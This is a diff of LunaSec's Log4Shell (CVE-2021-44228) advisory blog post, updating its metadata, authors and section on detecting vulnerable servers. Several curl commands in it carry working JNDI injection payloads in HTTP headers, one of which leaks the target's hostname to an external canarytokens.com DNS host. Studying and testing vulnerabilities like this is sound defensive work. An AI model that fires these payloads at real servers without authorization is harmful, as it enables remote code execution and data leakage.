@@ -3,6 +3,7 @@ title: "Log4Shell: RCE 0-day exploit found in log4j 2, a popular Java logging pa
 description: Given how ubiquitous log4j is, the impact of this vulnerability is quite severe. Learn how to patch it, why it's bad, and more in this post.
 slug: log4j-zero-day
 image: https://www.lunasec.io/docs/img/log4shell-logo.png
+date: 2021-12-12
 authors:
 - name: Free Wortley
   title: CEO at LunaSec
@@ -13,6 +14,10 @@ authors:
   title: Developer at Lunasec
   url: https://github.com/breadchris
   image_url: https://github.com/breadchris.png
+- name: Forrest Allison
+  title: Developer at LunaSec
+  url: https://github.com/factoidforrest
+  image_url: https://github.com/factoidforrest.png
 
 ---
 <!--
@@ -31,11 +36,13 @@ authors:
 
 ![Log4Shell Logo](https://www.lunasec.io/docs/img/log4shell-logo.png)
 
-_Updated @ December 11th, 7:30pm PST_
+
+_Updated @ December 12th, 11:30pm PST_
 
 _This blog post is also available at https://log4shell.com/_
 
-A few hours ago, a 0-day exploit in the
+## What is it?
+On Thursday (December 9th), a 0-day exploit in the
 popular Java logging library `log4j` (version 2) was discovered that results in Remote Code Execution (RCE) by
 logging a certain string.
 
@@ -43,10 +50,9 @@ Given how ubiquitous this library is, the impact of the exploit (full server con
 the impact of this vulnerability is quite severe. We're calling it "Log4Shell" for short.
 
 The 0-day was [tweeted](https://twitter.com/P0rZ9/status/1468949890571337731) along with a POC posted on
-[GitHub](https://github.com/tangxiaofeng7/apache-log4j-poc).  ~~Since this vulnerability is still very new, there isn't a CVE to track
-it yet.~~ This has been published as [CVE-2021-44228](https://www.randori.com/blog/cve-2021-44228/).
+[GitHub](https://github.com/tangxiaofeng7/apache-log4j-poc).  It has now been published as [CVE-2021-44228](https://www.randori.com/blog/cve-2021-44228/).
 
-This post provides resources to help you understand the vulnerability and how to mitigate it for yourself.
+This post provides resources to help you understand the vulnerability and how to mitigate it.
 
 <!--truncate-->
 
@@ -54,6 +60,8 @@ This post provides resources to help you understand the vulnerability and how to
 
 Many, many services are vulnerable to this exploit.  Cloud services like [Steam, Apple iCloud](https://news.ycombinator.com/item?id=29499867), and apps like
 Minecraft have already been found to be vulnerable.
+
+An extensive list of responses from impacted organizations has been compiled [here](https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592).
 
 Anybody using Apache Struts is likely vulnerable. We've seen similar vulnerabilities exploited before in breaches like
 the [2017 Equifax data breach](https://en.wikipedia.org/wiki/2017_Equifax_data_breach#Data_breach).
@@ -159,7 +167,7 @@ docker run -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
 and in another:
 
 ```shell
-curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1/a}'
+curl 127.0.0.1:8080 -H 'User-Agent: ${jndi:ldap://127.0.0.1/a}'
 ```
 
 the logs should include an error message indicating that a remote lookup was attempted but failed:
@@ -180,25 +188,26 @@ Due to how common Java vulnerabilities such as these are, security researchers h
 them. The [marshalsec](https://github.com/mbechler/marshalsec) project is one of many that demonstrates generating an
 exploit payload that could be used for this vulnerability. You can refer to [this malicious LDAP server](https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java) for an example of exploitation.
 
-## How to identify if your server is vulnerable.
+## How to identify vulnerable remote servers
 
-Using a DNS logger (such as [dnslog.cn](http://www.dnslog.cn/)), you can generate a domain name and use this in your test
-payloads:
+Make sure that you have permission from the owner of the server to be penetration tested.  
+
+The simplest way to detect if a remote endpoint is vulnerable is to trigger a DNS query. As explained above,
+the exploit will cause the vulnerable server to attempt to fetch some remote code.  By using the address
+of a free online DNS logging tool in the exploit string, we can detect when the vulnerability is triggered.  
+
+[CanaryTokens.org](https://canarytokens.org/generate#) is an Open Source web app for this purpose that even generates the exploit string automatically 
+and sends an email notification when the DNS is queried.  Select `Log4Shell` from the drop-down menu. Then, embed the string 
+in a request field that you expect the server to log.  This could be an anything from a form
+input to an HTTP header.  In our example above, the User-Agent header was being logged. This request should trigger it:
 
 ```shell
-curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}'
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://x${hostName}.L4J.<RANDOM_STRING>.canarytokens.com/a}'
 ```
 
-Refreshing the page will show DNS queries which identify hosts who have triggered the vulnerability.
-
-:::caution
-
-While _dnslog.cn_ has become popular for testing log4shell, we advise caution. When testing sensitive infrastructure,
-information sent to this site could be used by its owner to catalogue and later exploit it.
-
+:::info These requests may not be private
 If you wish to test more discretely, you may [setup your own authoritative DNS server](https://www.joshmcguigan.com/blog/run-your-own-dns-servers/)
 for testing.
-
 :::
 
 ## More information
@@ -238,6 +247,7 @@ methods are still prevalent.
 8. Update social info.
 9. Updated example code to use Log4j2 syntax.
 10. Update title because of some confusion.
+11. Better DNS testing site and explanation
 
 ### References
 
